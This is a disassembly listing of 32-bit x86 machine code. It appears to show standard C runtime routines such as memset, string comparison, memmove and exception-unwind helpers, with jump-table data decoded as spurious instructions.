  42624c:	ret    
  42624d:	int3   
  42624e:	int3   
  42624f:	int3   
  426250:	mov    edx,DWORD PTR [esp+0xc]
  426254:	mov    ecx,DWORD PTR [esp+0x4]
  426258:	test   edx,edx
  42625a:	je     0x4262ab
  42625c:	xor    eax,eax
  42625e:	mov    al,BYTE PTR [esp+0x8]
  426262:	push   edi
  426263:	mov    edi,ecx
  426265:	cmp    edx,0x4
  426268:	jb     0x42629b
  42626a:	neg    ecx
  42626c:	and    ecx,0x3
  42626f:	je     0x42627d
  426271:	sub    edx,ecx
  426273:	mov    BYTE PTR [edi],al
  426275:	add    edi,0x1
  426278:	sub    ecx,0x1
  42627b:	jne    0x426273
  42627d:	mov    ecx,eax
  42627f:	shl    eax,0x8
  426282:	add    eax,ecx
  426284:	mov    ecx,eax
  426286:	shl    eax,0x10
  426289:	add    eax,ecx
  42628b:	mov    ecx,edx
  42628d:	and    edx,0x3
  426290:	shr    ecx,0x2
  426293:	je     0x42629b
  426295:	rep stos DWORD PTR es:[edi],eax
  426297:	test   edx,edx
  426299:	je     0x4262a5
  42629b:	mov    BYTE PTR [edi],al
  42629d:	add    edi,0x1
  4262a0:	sub    edx,0x1
  4262a3:	jne    0x42629b
  4262a5:	mov    eax,DWORD PTR [esp+0x8]
  4262a9:	pop    edi
  4262aa:	ret    
  4262ab:	mov    eax,DWORD PTR [esp+0x4]
  4262af:	ret    
  4262b0:	push   esi
  4262b1:	mov    esi,DWORD PTR [esp+0x8]
  4262b5:	test   esi,esi
  4262b7:	je     0x42643e
  4262bd:	push   DWORD PTR [esi+0x4]
  4262c0:	call   0x42455a
  4262c5:	push   DWORD PTR [esi+0x8]
  4262c8:	call   0x42455a
  4262cd:	push   DWORD PTR [esi+0xc]
  4262d0:	call   0x42455a
  4262d5:	push   DWORD PTR [esi+0x10]
  4262d8:	call   0x42455a
  4262dd:	push   DWORD PTR [esi+0x14]
  4262e0:	call   0x42455a
  4262e5:	push   DWORD PTR [esi+0x18]
  4262e8:	call   0x42455a
  4262ed:	push   DWORD PTR [esi]
  4262ef:	call   0x42455a
  4262f4:	push   DWORD PTR [esi+0x20]
  4262f7:	call   0x42455a
  4262fc:	push   DWORD PTR [esi+0x24]
  4262ff:	call   0x42455a
  426304:	push   DWORD PTR [esi+0x28]
  426307:	call   0x42455a
  42630c:	push   DWORD PTR [esi+0x2c]
  42630f:	call   0x42455a
  426314:	push   DWORD PTR [esi+0x30]
  426317:	call   0x42455a
  42631c:	push   DWORD PTR [esi+0x34]
  42631f:	call   0x42455a
  426324:	push   DWORD PTR [esi+0x1c]
  426327:	call   0x42455a
  42632c:	push   DWORD PTR [esi+0x38]
  42632f:	call   0x42455a
  426334:	push   DWORD PTR [esi+0x3c]
  426337:	call   0x42455a
  42633c:	add    esp,0x40
  42633f:	push   DWORD PTR [esi+0x40]
  426342:	call   0x42455a
  426347:	push   DWORD PTR [esi+0x44]
  42634a:	call   0x42455a
  42634f:	push   DWORD PTR [esi+0x48]
  426352:	call   0x42455a
  426357:	push   DWORD PTR [esi+0x4c]
  42635a:	call   0x42455a
  42635f:	push   DWORD PTR [esi+0x50]
  426362:	call   0x42455a
  426367:	push   DWORD PTR [esi+0x54]
  42636a:	call   0x42455a
  42636f:	push   DWORD PTR [esi+0x58]
  426372:	call   0x42455a
  426377:	push   DWORD PTR [esi+0x5c]
  42637a:	call   0x42455a
  42637f:	push   DWORD PTR [esi+0x60]
  426382:	call   0x42455a
  426387:	push   DWORD PTR [esi+0x64]
  42638a:	call   0x42455a
  42638f:	push   DWORD PTR [esi+0x68]
  426392:	call   0x42455a
  426397:	push   DWORD PTR [esi+0x6c]
  42639a:	call   0x42455a
  42639f:	push   DWORD PTR [esi+0x70]
  4263a2:	call   0x42455a
  4263a7:	push   DWORD PTR [esi+0x74]
  4263aa:	call   0x42455a
  4263af:	push   DWORD PTR [esi+0x78]
  4263b2:	call   0x42455a
  4263b7:	push   DWORD PTR [esi+0x7c]
  4263ba:	call   0x42455a
  4263bf:	add    esp,0x40
  4263c2:	push   DWORD PTR [esi+0x80]
  4263c8:	call   0x42455a
  4263cd:	push   DWORD PTR [esi+0x84]
  4263d3:	call   0x42455a
  4263d8:	push   DWORD PTR [esi+0x88]
  4263de:	call   0x42455a
  4263e3:	push   DWORD PTR [esi+0x8c]
  4263e9:	call   0x42455a
  4263ee:	push   DWORD PTR [esi+0x90]
  4263f4:	call   0x42455a
  4263f9:	push   DWORD PTR [esi+0x94]
  4263ff:	call   0x42455a
  426404:	push   DWORD PTR [esi+0x98]
  42640a:	call   0x42455a
  42640f:	push   DWORD PTR [esi+0x9c]
  426415:	call   0x42455a
  42641a:	push   DWORD PTR [esi+0xa0]
  426420:	call   0x42455a
  426425:	push   DWORD PTR [esi+0xa4]
  42642b:	call   0x42455a
  426430:	push   DWORD PTR [esi+0xa8]
  426436:	call   0x42455a
  42643b:	add    esp,0x2c
  42643e:	pop    esi
  42643f:	ret    
  426440:	push   esi
  426441:	mov    esi,DWORD PTR [esp+0x8]
  426445:	test   esi,esi
  426447:	je     0x42649d
  426449:	mov    eax,DWORD PTR [esi]
  42644b:	mov    ecx,DWORD PTR ds:0x464bc4
  426451:	cmp    eax,DWORD PTR [ecx]
  426453:	je     0x426464
  426455:	cmp    eax,DWORD PTR ds:0x464b94
  42645b:	je     0x426464
  42645d:	push   eax
  42645e:	call   0x42455a
  426463:	pop    ecx
  426464:	mov    eax,DWORD PTR [esi+0x4]
  426467:	mov    ecx,DWORD PTR ds:0x464bc4
  42646d:	cmp    eax,DWORD PTR [ecx+0x4]
  426470:	je     0x426481
  426472:	cmp    eax,DWORD PTR ds:0x464b98
  426478:	je     0x426481
  42647a:	push   eax
  42647b:	call   0x42455a
  426480:	pop    ecx
  426481:	mov    esi,DWORD PTR [esi+0x8]
  426484:	mov    eax,ds:0x464bc4
  426489:	cmp    esi,DWORD PTR [eax+0x8]
  42648c:	je     0x42649d
  42648e:	cmp    esi,DWORD PTR ds:0x464b9c
  426494:	je     0x42649d
  426496:	push   esi
  426497:	call   0x42455a
  42649c:	pop    ecx
  42649d:	pop    esi
  42649e:	ret    
  42649f:	push   esi
  4264a0:	mov    esi,DWORD PTR [esp+0x8]
  4264a4:	test   esi,esi
  4264a6:	je     0x426576
  4264ac:	mov    eax,DWORD PTR [esi+0xc]
  4264af:	mov    ecx,DWORD PTR ds:0x464bc4
  4264b5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264b8:	je     0x4264c9
  4264ba:	cmp    eax,DWORD PTR ds:0x464ba0
  4264c0:	je     0x4264c9
  4264c2:	push   eax
  4264c3:	call   0x42455a
  4264c8:	pop    ecx
  4264c9:	mov    eax,DWORD PTR [esi+0x10]
  4264cc:	mov    ecx,DWORD PTR ds:0x464bc4
  4264d2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264d5:	je     0x4264e6
  4264d7:	cmp    eax,DWORD PTR ds:0x464ba4
  4264dd:	je     0x4264e6
  4264df:	push   eax
  4264e0:	call   0x42455a
  4264e5:	pop    ecx
  4264e6:	mov    eax,DWORD PTR [esi+0x14]
  4264e9:	mov    ecx,DWORD PTR ds:0x464bc4
  4264ef:	cmp    eax,DWORD PTR [ecx+0x14]
  4264f2:	je     0x426503
  4264f4:	cmp    eax,DWORD PTR ds:0x464ba8
  4264fa:	je     0x426503
  4264fc:	push   eax
  4264fd:	call   0x42455a
  426502:	pop    ecx
  426503:	mov    eax,DWORD PTR [esi+0x18]
  426506:	mov    ecx,DWORD PTR ds:0x464bc4
  42650c:	cmp    eax,DWORD PTR [ecx+0x18]
  42650f:	je     0x426520
  426511:	cmp    eax,DWORD PTR ds:0x464bac
  426517:	je     0x426520
  426519:	push   eax
  42651a:	call   0x42455a
  42651f:	pop    ecx
  426520:	mov    eax,DWORD PTR [esi+0x1c]
  426523:	mov    ecx,DWORD PTR ds:0x464bc4
  426529:	cmp    eax,DWORD PTR [ecx+0x1c]
  42652c:	je     0x42653d
  42652e:	cmp    eax,DWORD PTR ds:0x464bb0
  426534:	je     0x42653d
  426536:	push   eax
  426537:	call   0x42455a
  42653c:	pop    ecx
  42653d:	mov    eax,DWORD PTR [esi+0x20]
  426540:	mov    ecx,DWORD PTR ds:0x464bc4
  426546:	cmp    eax,DWORD PTR [ecx+0x20]
  426549:	je     0x42655a
  42654b:	cmp    eax,DWORD PTR ds:0x464bb4
  426551:	je     0x42655a
  426553:	push   eax
  426554:	call   0x42455a
  426559:	pop    ecx
  42655a:	mov    esi,DWORD PTR [esi+0x24]
  42655d:	mov    eax,ds:0x464bc4
  426562:	cmp    esi,DWORD PTR [eax+0x24]
  426565:	je     0x426576
  426567:	cmp    esi,DWORD PTR ds:0x464bb8
  42656d:	je     0x426576
  42656f:	push   esi
  426570:	call   0x42455a
  426575:	pop    ecx
  426576:	pop    esi
  426577:	ret    
  426578:	int3   
  426579:	int3   
  42657a:	int3   
  42657b:	int3   
  42657c:	int3   
  42657d:	int3   
  42657e:	int3   
  42657f:	int3   
  426580:	push   ebp
  426581:	mov    ebp,esp
  426583:	push   esi
  426584:	xor    eax,eax
  426586:	push   eax
  426587:	push   eax
  426588:	push   eax
  426589:	push   eax
  42658a:	push   eax
  42658b:	push   eax
  42658c:	push   eax
  42658d:	push   eax
  42658e:	mov    edx,DWORD PTR [ebp+0xc]
  426591:	lea    ecx,[ecx+0x0]
  426594:	mov    al,BYTE PTR [edx]
  426596:	or     al,al
  426598:	je     0x4265a3
  42659a:	add    edx,0x1
  42659d:	bts    DWORD PTR [esp],eax
  4265a1:	jmp    0x426594
  4265a3:	mov    esi,DWORD PTR [ebp+0x8]
  4265a6:	or     ecx,0xffffffff
  4265a9:	lea    ecx,[ecx+0x0]
  4265ac:	add    ecx,0x1
  4265af:	mov    al,BYTE PTR [esi]
  4265b1:	or     al,al
  4265b3:	je     0x4265be
  4265b5:	add    esi,0x1
  4265b8:	bt     DWORD PTR [esp],eax
  4265bc:	jae    0x4265ac
  4265be:	mov    eax,ecx
  4265c0:	add    esp,0x20
  4265c3:	pop    esi
  4265c4:	leave  
  4265c5:	ret    
  4265c6:	int3   
  4265c7:	int3   
  4265c8:	int3   
  4265c9:	int3   
  4265ca:	int3   
  4265cb:	int3   
  4265cc:	int3   
  4265cd:	int3   
  4265ce:	int3   
  4265cf:	int3   
  4265d0:	mov    edx,DWORD PTR [esp+0x4]
  4265d4:	mov    ecx,DWORD PTR [esp+0x8]
  4265d8:	test   edx,0x3
  4265de:	jne    0x42661c
  4265e0:	mov    eax,DWORD PTR [edx]
  4265e2:	cmp    al,BYTE PTR [ecx]
  4265e4:	jne    0x426614
  4265e6:	or     al,al
  4265e8:	je     0x426610
  4265ea:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ed:	jne    0x426614
  4265ef:	or     ah,ah
  4265f1:	je     0x426610
  4265f3:	shr    eax,0x10
  4265f6:	cmp    al,BYTE PTR [ecx+0x2]
  4265f9:	jne    0x426614
  4265fb:	or     al,al
  4265fd:	je     0x426610
  4265ff:	cmp    ah,BYTE PTR [ecx+0x3]
  426602:	jne    0x426614
  426604:	add    ecx,0x4
  426607:	add    edx,0x4
  42660a:	or     ah,ah
  42660c:	jne    0x4265e0
  42660e:	mov    edi,edi
  426610:	xor    eax,eax
  426612:	ret    
  426613:	nop
  426614:	sbb    eax,eax
  426616:	shl    eax,1
  426618:	add    eax,0x1
  42661b:	ret    
  42661c:	test   edx,0x1
  426622:	je     0x42663c
  426624:	mov    al,BYTE PTR [edx]
  426626:	add    edx,0x1
  426629:	cmp    al,BYTE PTR [ecx]
  42662b:	jne    0x426614
  42662d:	add    ecx,0x1
  426630:	or     al,al
  426632:	je     0x426610
  426634:	test   edx,0x2
  42663a:	je     0x4265e0
  42663c:	mov    ax,WORD PTR [edx]
  42663f:	add    edx,0x2
  426642:	cmp    al,BYTE PTR [ecx]
  426644:	jne    0x426614
  426646:	or     al,al
  426648:	je     0x426610
  42664a:	cmp    ah,BYTE PTR [ecx+0x1]
  42664d:	jne    0x426614
  42664f:	or     ah,ah
  426651:	je     0x426610
  426653:	add    ecx,0x2
  426656:	jmp    0x4265e0
  426658:	int3   
  426659:	int3   
  42665a:	int3   
  42665b:	int3   
  42665c:	int3   
  42665d:	int3   
  42665e:	int3   
  42665f:	int3   
  426660:	mov    eax,DWORD PTR [esp+0xc]
  426664:	test   eax,eax
  426666:	je     0x4266b2
  426668:	mov    edx,DWORD PTR [esp+0x4]
  42666c:	push   esi
  42666d:	push   edi
  42666e:	mov    esi,edx
  426670:	mov    edi,DWORD PTR [esp+0x10]
  426674:	or     edx,edi
  426676:	and    edx,0x3
  426679:	je     0x4266b3
  42667b:	test   eax,0x1
  426680:	je     0x426693
  426682:	mov    cl,BYTE PTR [esi]
  426684:	cmp    cl,BYTE PTR [edi]
  426686:	jne    0x4266e0
  426688:	add    esi,0x1
  42668b:	add    edi,0x1
  42668e:	sub    eax,0x1
  426691:	je     0x4266b0
  426693:	mov    cl,BYTE PTR [esi]
  426695:	mov    dl,BYTE PTR [edi]
  426697:	cmp    cl,dl
  426699:	jne    0x4266e0
  42669b:	mov    cl,BYTE PTR [esi+0x1]
  42669e:	mov    dl,BYTE PTR [edi+0x1]
  4266a1:	cmp    cl,dl
  4266a3:	jne    0x4266e0
  4266a5:	add    edi,0x2
  4266a8:	add    esi,0x2
  4266ab:	sub    eax,0x2
  4266ae:	jne    0x426693
  4266b0:	pop    edi
  4266b1:	pop    esi
  4266b2:	ret    
  4266b3:	mov    ecx,eax
  4266b5:	and    eax,0x3
  4266b8:	shr    ecx,0x2
  4266bb:	je     0x4266e8
  4266bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bf:	je     0x4266e8
  4266c1:	mov    ecx,DWORD PTR [esi-0x4]
  4266c4:	mov    edx,DWORD PTR [edi-0x4]
  4266c7:	cmp    cl,dl
  4266c9:	jne    0x4266db
  4266cb:	cmp    ch,dh
  4266cd:	jne    0x4266db
  4266cf:	shr    ecx,0x10
  4266d2:	shr    edx,0x10
  4266d5:	cmp    cl,dl
  4266d7:	jne    0x4266db
  4266d9:	cmp    ch,dh
  4266db:	mov    eax,0x0
  4266e0:	sbb    eax,eax
  4266e2:	pop    edi
  4266e3:	sbb    eax,0xffffffff
  4266e6:	pop    esi
  4266e7:	ret    
  4266e8:	test   eax,eax
  4266ea:	je     0x4266b0
  4266ec:	mov    edx,DWORD PTR [esi]
  4266ee:	mov    ecx,DWORD PTR [edi]
  4266f0:	cmp    dl,cl
  4266f2:	jne    0x4266db
  4266f4:	sub    eax,0x1
  4266f7:	je     0x426715
  4266f9:	cmp    dh,ch
  4266fb:	jne    0x4266db
  4266fd:	sub    eax,0x1
  426700:	je     0x426715
  426702:	and    ecx,0xff0000
  426708:	and    edx,0xff0000
  42670e:	cmp    edx,ecx
  426710:	jne    0x4266db
  426712:	sub    eax,0x1
  426715:	pop    edi
  426716:	pop    esi
  426717:	ret    
  426718:	int3   
  426719:	int3   
  42671a:	int3   
  42671b:	int3   
  42671c:	int3   
  42671d:	int3   
  42671e:	int3   
  42671f:	int3   
  426720:	push   ebp
  426721:	mov    ebp,esp
  426723:	push   edi
  426724:	push   esi
  426725:	push   ebx
  426726:	mov    ecx,DWORD PTR [ebp+0x10]
  426729:	jecxz  0x426752
  42672b:	mov    ebx,ecx
  42672d:	mov    edi,DWORD PTR [ebp+0x8]
  426730:	mov    esi,edi
  426732:	xor    eax,eax
  426734:	repnz scas al,BYTE PTR es:[edi]
  426736:	neg    ecx
  426738:	add    ecx,ebx
  42673a:	mov    edi,esi
  42673c:	mov    esi,DWORD PTR [ebp+0xc]
  42673f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426741:	mov    al,BYTE PTR [esi-0x1]
  426744:	xor    ecx,ecx
  426746:	cmp    al,BYTE PTR [edi-0x1]
  426749:	ja     0x426750
  42674b:	je     0x426752
  42674d:	sub    ecx,0x2
  426750:	not    ecx
  426752:	mov    eax,ecx
  426754:	pop    ebx
  426755:	pop    esi
  426756:	pop    edi
  426757:	leave  
  426758:	ret    
  426759:	int3   
  42675a:	int3   
  42675b:	int3   
  42675c:	int3   
  42675d:	int3   
  42675e:	int3   
  42675f:	int3   
  426760:	push   ebp
  426761:	mov    ebp,esp
  426763:	push   esi
  426764:	xor    eax,eax
  426766:	push   eax
  426767:	push   eax
  426768:	push   eax
  426769:	push   eax
  42676a:	push   eax
  42676b:	push   eax
  42676c:	push   eax
  42676d:	push   eax
  42676e:	mov    edx,DWORD PTR [ebp+0xc]
  426771:	lea    ecx,[ecx+0x0]
  426774:	mov    al,BYTE PTR [edx]
  426776:	or     al,al
  426778:	je     0x426783
  42677a:	add    edx,0x1
  42677d:	bts    DWORD PTR [esp],eax
  426781:	jmp    0x426774
  426783:	mov    esi,DWORD PTR [ebp+0x8]
  426786:	mov    edi,edi
  426788:	mov    al,BYTE PTR [esi]
  42678a:	or     al,al
  42678c:	je     0x42679a
  42678e:	add    esi,0x1
  426791:	bt     DWORD PTR [esp],eax
  426795:	jae    0x426788
  426797:	lea    eax,[esi-0x1]
  42679a:	add    esp,0x20
  42679d:	pop    esi
  42679e:	leave  
  42679f:	ret    
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   ebx
  4267a4:	push   esi
  4267a5:	push   edi
  4267a6:	push   ebp
  4267a7:	push   0x0
  4267a9:	push   0x0
  4267ab:	push   0x4267b8
  4267b0:	push   DWORD PTR [ebp+0x8]
  4267b3:	call   0x42722e
  4267b8:	pop    ebp
  4267b9:	pop    edi
  4267ba:	pop    esi
  4267bb:	pop    ebx
  4267bc:	mov    esp,ebp
  4267be:	pop    ebp
  4267bf:	ret    
  4267c0:	mov    ecx,DWORD PTR [esp+0x4]
  4267c4:	test   DWORD PTR [ecx+0x4],0x6
  4267cb:	mov    eax,0x1
  4267d0:	je     0x4267e1
  4267d2:	mov    eax,DWORD PTR [esp+0x8]
  4267d6:	mov    edx,DWORD PTR [esp+0x10]
  4267da:	mov    DWORD PTR [edx],eax
  4267dc:	mov    eax,0x3
  4267e1:	ret    
  4267e2:	push   ebx
  4267e3:	push   esi
  4267e4:	push   edi
  4267e5:	mov    eax,DWORD PTR [esp+0x10]
  4267e9:	push   eax
  4267ea:	push   0xfffffffe
  4267ec:	push   0x4267c0
  4267f1:	push   DWORD PTR fs:0x0
  4267f8:	mov    DWORD PTR fs:0x0,esp
  4267ff:	mov    eax,DWORD PTR [esp+0x20]
  426803:	mov    ebx,DWORD PTR [eax+0x8]
  426806:	mov    esi,DWORD PTR [eax+0xc]
  426809:	cmp    esi,0xffffffff
  42680c:	je     0x42683c
  42680e:	cmp    esi,DWORD PTR [esp+0x24]
  426812:	je     0x42683c
  426814:	lea    esi,[esi+esi*2]
  426817:	mov    ecx,DWORD PTR [ebx+esi*4]
  42681a:	mov    DWORD PTR [esp+0x8],ecx
  42681e:	mov    DWORD PTR [eax+0xc],ecx
  426821:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426826:	jne    0x42683a
  426828:	push   0x101
  42682d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426831:	call   0x426876
  426836:	call   DWORD PTR [ebx+esi*4+0x8]
  42683a:	jmp    0x4267ff
  42683c:	pop    DWORD PTR fs:0x0
  426843:	add    esp,0xc
  426846:	pop    edi
  426847:	pop    esi
  426848:	pop    ebx
  426849:	ret    
  42684a:	xor    eax,eax
  42684c:	mov    ecx,DWORD PTR fs:0x0
  426853:	cmp    DWORD PTR [ecx+0x4],0x4267c0
  42685a:	jne    0x42686c
  42685c:	mov    edx,DWORD PTR [ecx+0xc]
  42685f:	mov    edx,DWORD PTR [edx+0xc]
  426862:	cmp    DWORD PTR [ecx+0x8],edx
  426865:	jne    0x42686c
  426867:	mov    eax,0x1
  42686c:	ret    
  42686d:	push   ebx
  42686e:	push   ecx
  42686f:	mov    ebx,0x464bdc
  426874:	jmp    0x426880
  426876:	push   ebx
  426877:	push   ecx
  426878:	mov    ebx,0x464bdc
  42687d:	mov    ecx,DWORD PTR [ebp+0x8]
  426880:	mov    DWORD PTR [ebx+0x8],ecx
  426883:	mov    DWORD PTR [ebx+0x4],eax
  426886:	mov    DWORD PTR [ebx+0xc],ebp
  426889:	pop    ecx
  42688a:	pop    ebx
  42688b:	ret    0x4
  42688e:	int3   
  42688f:	int3   
  426890:	push   ebp
  426891:	mov    ebp,esp
  426893:	push   edi
  426894:	push   esi
  426895:	mov    esi,DWORD PTR [ebp+0xc]
  426898:	mov    ecx,DWORD PTR [ebp+0x10]
  42689b:	mov    edi,DWORD PTR [ebp+0x8]
  42689e:	mov    eax,ecx
  4268a0:	mov    edx,ecx
  4268a2:	add    eax,esi
  4268a4:	cmp    edi,esi
  4268a6:	jbe    0x4268b0
  4268a8:	cmp    edi,eax
  4268aa:	jb     0x426a2c
  4268b0:	test   edi,0x3
  4268b6:	jne    0x4268cc
  4268b8:	shr    ecx,0x2
  4268bb:	and    edx,0x3
  4268be:	cmp    ecx,0x8
  4268c1:	jb     0x4268ec
  4268c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c5:	jmp    DWORD PTR [edx*4+0x4269dc]
  4268cc:	mov    eax,edi
  4268ce:	mov    edx,0x3
  4268d3:	sub    ecx,0x4
  4268d6:	jb     0x4268e4
  4268d8:	and    eax,0x3
  4268db:	add    ecx,eax
  4268dd:	jmp    DWORD PTR [eax*4+0x4268f0]
  4268e4:	jmp    DWORD PTR [ecx*4+0x4269ec]
  4268eb:	nop
  4268ec:	jmp    DWORD PTR [ecx*4+0x426970]
  4268f3:	nop
  4268f4:	add    BYTE PTR [ecx+0x42],ch
  4268f7:	add    BYTE PTR [ecx+ebp*2],ch
  4268fa:	inc    edx
  4268fb:	add    BYTE PTR [eax+0x69],dl
  4268fe:	inc    edx
  4268ff:	add    BYTE PTR [ebx],ah
  426901:	ror    DWORD PTR [edx-0x75f877fa],1
  426907:	inc    esi
  426908:	add    DWORD PTR [eax+0x468a0147],ecx
  42690e:	add    al,cl
  426910:	jmp    0x289f117
  426915:	add    esi,0x3
  426918:	add    edi,0x3
  42691b:	cmp    ecx,0x8
  42691e:	jb     0x4268ec
  426920:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426922:	jmp    DWORD PTR [edx*4+0x4269dc]
  426929:	lea    ecx,[ecx+0x0]
  42692c:	and    edx,ecx
  42692e:	mov    al,BYTE PTR [esi]
  426930:	mov    BYTE PTR [edi],al
  426932:	mov    al,BYTE PTR [esi+0x1]
  426935:	shr    ecx,0x2
  426938:	mov    BYTE PTR [edi+0x1],al
  42693b:	add    esi,0x2
  42693e:	add    edi,0x2
  426941:	cmp    ecx,0x8
  426944:	jb     0x4268ec
  426946:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426948:	jmp    DWORD PTR [edx*4+0x4269dc]
  42694f:	nop
  426950:	and    edx,ecx
  426952:	mov    al,BYTE PTR [esi]
  426954:	mov    BYTE PTR [edi],al
  426956:	add    esi,0x1
  426959:	shr    ecx,0x2
  42695c:	add    edi,0x1
  42695f:	cmp    ecx,0x8
  426962:	jb     0x4268ec
  426964:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426966:	jmp    DWORD PTR [edx*4+0x4269dc]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	shr    DWORD PTR [ecx+0x42],cl
  426973:	add    al,al
  426975:	imul   eax,DWORD PTR [edx+0x0],0x4269b8
  42697c:	mov    al,0x69
  42697e:	inc    edx
  42697f:	add    BYTE PTR [eax-0x5fffbd97],ch
  426985:	imul   eax,DWORD PTR [edx+0x0],0x426998
  42698c:	nop
  42698d:	imul   eax,DWORD PTR [edx+0x0],0xe48e448b
  426994:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269c8:	lea    eax,[ecx*4+0x0]
  4269cf:	add    esi,eax
  4269d1:	add    edi,eax
  4269d3:	jmp    DWORD PTR [edx*4+0x4269dc]
  4269da:	mov    edi,edi
  4269dc:	in     al,dx
  4269dd:	imul   eax,DWORD PTR [edx+0x0],0x4269f4
  4269e4:	add    BYTE PTR [edx+0x42],ch
  4269e7:	add    BYTE PTR [edx+ebp*2],dl
  4269ea:	inc    edx
  4269eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269f1:	leave  
  4269f2:	ret    
  4269f3:	nop
  4269f4:	mov    al,BYTE PTR [esi]
  4269f6:	mov    BYTE PTR [edi],al
  4269f8:	mov    eax,DWORD PTR [ebp+0x8]
  4269fb:	pop    esi
  4269fc:	pop    edi
  4269fd:	leave  
  4269fe:	ret    
  4269ff:	nop
  426a00:	mov    al,BYTE PTR [esi]
  426a02:	mov    BYTE PTR [edi],al
  426a04:	mov    al,BYTE PTR [esi+0x1]
  426a07:	mov    BYTE PTR [edi+0x1],al
  426a0a:	mov    eax,DWORD PTR [ebp+0x8]
  426a0d:	pop    esi
  426a0e:	pop    edi
  426a0f:	leave  
  426a10:	ret    
  426a11:	lea    ecx,[ecx+0x0]
  426a14:	mov    al,BYTE PTR [esi]
  426a16:	mov    BYTE PTR [edi],al
  426a18:	mov    al,BYTE PTR [esi+0x1]
  426a1b:	mov    BYTE PTR [edi+0x1],al
  426a1e:	mov    al,BYTE PTR [esi+0x2]
  426a21:	mov    BYTE PTR [edi+0x2],al
  426a24:	mov    eax,DWORD PTR [ebp+0x8]
  426a27:	pop    esi
  426a28:	pop    edi
  426a29:	leave  
  426a2a:	ret    
  426a2b:	nop
  426a2c:	lea    esi,[ecx+esi*1-0x4]
  426a30:	lea    edi,[ecx+edi*1-0x4]
  426a34:	test   edi,0x3
  426a3a:	jne    0x426a60
  426a3c:	shr    ecx,0x2
  426a3f:	and    edx,0x3
  426a42:	cmp    ecx,0x8
  426a45:	jb     0x426a54
  426a47:	std    
  426a48:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a4a:	cld    
  426a4b:	jmp    DWORD PTR [edx*4+0x426b78]
  426a52:	mov    edi,edi
  426a54:	neg    ecx
  426a56:	jmp    DWORD PTR [ecx*4+0x426b28]
  426a5d:	lea    ecx,[ecx+0x0]
  426a60:	mov    eax,edi
  426a62:	mov    edx,0x3
  426a67:	cmp    ecx,0x4
  426a6a:	jb     0x426a78
  426a6c:	and    eax,0x3
  426a6f:	sub    ecx,eax
  426a71:	jmp    DWORD PTR [eax*4+0x426a7c]
  426a78:	jmp    DWORD PTR [ecx*4+0x426b78]
  426a7f:	nop
  426a80:	mov    WORD PTR [edx+0x42],gs
  426a83:	add    BYTE PTR [eax-0x27ffbd96],dh
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a91:	mov    BYTE PTR [edi+0x3],al
  426a94:	sub    esi,0x1
  426a97:	shr    ecx,0x2
  426a9a:	sub    edi,0x1
  426a9d:	cmp    ecx,0x8
  426aa0:	jb     0x426a54
  426aa2:	std    
  426aa3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa5:	cld    
  426aa6:	jmp    DWORD PTR [edx*4+0x426b78]
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	and    edx,ecx
  426ab5:	mov    BYTE PTR [edi+0x3],al
  426ab8:	mov    al,BYTE PTR [esi+0x2]
  426abb:	shr    ecx,0x2
  426abe:	mov    BYTE PTR [edi+0x2],al
  426ac1:	sub    esi,0x2
  426ac4:	sub    edi,0x2
  426ac7:	cmp    ecx,0x8
  426aca:	jb     0x426a54
  426acc:	std    
  426acd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426acf:	cld    
  426ad0:	jmp    DWORD PTR [edx*4+0x426b78]
  426ad7:	nop
  426ad8:	mov    al,BYTE PTR [esi+0x3]
  426adb:	and    edx,ecx
  426add:	mov    BYTE PTR [edi+0x3],al
  426ae0:	mov    al,BYTE PTR [esi+0x2]
  426ae3:	mov    BYTE PTR [edi+0x2],al
  426ae6:	mov    al,BYTE PTR [esi+0x1]
  426ae9:	shr    ecx,0x2
  426aec:	mov    BYTE PTR [edi+0x1],al
  426aef:	sub    esi,0x3
  426af2:	sub    edi,0x3
  426af5:	cmp    ecx,0x8
  426af8:	jb     0x426a54
  426afe:	std    
  426aff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b01:	cld    
  426b02:	jmp    DWORD PTR [edx*4+0x426b78]
  426b09:	lea    ecx,[ecx+0x0]
  426b0c:	sub    al,0x6b
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2],dh
  426b12:	inc    edx
  426b13:	add    BYTE PTR [ebx+ebp*2],bh
  426b16:	inc    edx
  426b17:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b1b:	add    BYTE PTR [ebx+ebp*2+0x42],cl
